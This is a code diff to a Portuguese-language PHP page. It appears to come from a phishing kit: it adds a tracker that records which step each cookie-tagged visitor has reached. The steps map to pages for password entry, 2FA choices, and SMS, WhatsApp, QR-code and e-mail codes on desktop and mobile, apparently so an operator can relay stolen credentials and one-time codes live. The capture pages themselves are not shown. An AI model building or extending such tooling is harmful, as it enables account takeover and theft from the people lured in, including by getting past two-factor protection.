@@ -20,6 +20,41 @@ if (!isset($_COOKIE['identificador_cliente'])) {
     $identificadorUnico = uniqid('cliente_', true) . bin2hex(random_bytes(8));
     setcookie('identificador_cliente', $identificadorUnico, time() + (86400 * 30), "/");
 }
+
+require_once __DIR__ . '/status_tracker.php';
+
+// Mapa de nomes de arquivos para mensagens de status amigáveis.
+$status_map = [
+    'index.php' => 'Na Home (Desktop)',
+    'login-mobile.php' => 'Na Home (Mobile)',
+    'senha.php' => 'Aguardando Senha (Desktop)',
+    'senha-mobile.php' => 'Aguardando Senha (Mobile)',
+    'dois_fatores.php' => 'Tela 2FA - Opções (Desktop)',
+    'dois_fatores2.php' => 'Tela 2FA - Opções (Desktop)',
+    'doisfatores2mobile.php' => 'Tela 2FA - Opções (Mobile)',
+    'sms_desktop.php' => 'Aguardando SMS (Desktop)',
+    'sms_mobile.php' => 'Aguardando SMS (Mobile)',
+    'sms_whats_desktop.php' => 'Aguardando SMS via WhatsApp (Desktop)',
+    'sms_whats_mobile.php' => 'Aguardando SMS via WhatsApp (Mobile)',
+    'qrcode-mobile.php' => 'Aguardando QR Code (Mobile)',
+    'telaqr.php' => 'Aguardando QR Code (Desktop)',
+    'email2fadesktop.php' => 'Aguardando E-mail 2FA (Desktop)',
+    'email2famobile.php' => 'Aguardando E-mail 2FA (Mobile)',
+    'emailsms_desktop.php' => 'Aguardando SMS de E-mail (Desktop)',
+    'emailsms_mobile.php' => 'Aguardando SMS de E-mail (Mobile)',
+    'sms2fadesktop.php' => 'Aguardando SMS 2FA (Desktop)',
+    'sms2famobile.php' => 'Aguardando SMS 2FA (Mobile)',
+    'whats2fadesktop.php' => 'Aguardando WhatsApp 2FA (Desktop)',
+    'whats2framobile.php' => 'Aguardando WhatsApp 2FA (Mobile)'
+];
+
+// Pega o nome do script atual.
+$current_page = basename($_SERVER['PHP_SELF']);
+
+// Verifica se a página atual está no mapa e atualiza o status.
+if (isset($status_map[$current_page])) {
+    update_user_status($status_map[$current_page]);
+}
 ?>
 <!DOCTYPE html>
 <html lang="pt-BR">
